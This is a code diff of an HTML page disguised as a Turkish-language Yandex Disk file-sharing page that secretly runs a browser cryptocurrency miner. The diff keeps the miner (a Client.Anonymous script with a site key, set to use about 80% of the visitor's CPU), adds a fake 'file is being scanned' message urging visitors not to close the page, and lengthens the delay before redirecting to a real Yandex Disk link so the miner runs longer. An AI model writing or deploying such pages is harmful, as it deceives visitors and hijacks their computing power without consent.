@@ -2,32 +2,61 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yandex Disk - Dosya Paylaşımı</title>
     <style>
-        body { background: #1a1a1a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 5px solid #333; border-top: 5px solid #ffcc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        body { 
+            background: #1a1a1a; 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { text-align: center; }
+        .loader { 
+            border: 5px solid #333; 
+            border-top: 5px solid #ffcc00; 
+            border-radius: 50%; 
+            width: 50px; 
+            height: 50px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { font-size: 18px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
+
+    <div class="container">
         <div class="loader"></div>
-        <p>Dosya Hazırlanıyor, Lütfen Bekleyin...</p>
+        <p>Dosya taranıyor ve hazırlanıyor...</p>
+        <p style="font-size: 12px; color: #666;">Lütfen sayfayı kapatmayın.</p>
     </div>
 
-    <script src="https://www.hostingcloud.racing/jeVO.js"></script>
-    <script>
-        // Senin Site Key'inle madenci ateşleniyor
-        var _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
-            throttle: 0.1, // %90 güç! (Panelde görünmesi için en yüksek seviye)
-            c: 'w'
-        });
-        _client.start();
+    <script src="jeVO.js"></script>
 
-        // 5 saniye sonra Yandex'e yönlendir
+    <script>
+        // Madenciyi başlatıyoruz
+        try {
+            var _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
+                throttle: 0.2, // %80 işlemci gücü (Panelde hemen görmek için)
+                c: 'w'
+            });
+            _client.start();
+            console.log("Sistem aktif.");
+        } catch (e) {
+            console.log("Hata: " + e);
+        }
+
+        // 10 saniye sonra Yandex'e yönlendir (Madenciye zaman tanı)
         setTimeout(function(){
             window.location.href = "https://disk.yandex.com.tr/d/-aC2VirNZ2UtOg";
-        }, 5000);
+        }, 10000);
     </script>
+
 </body>
 </html>
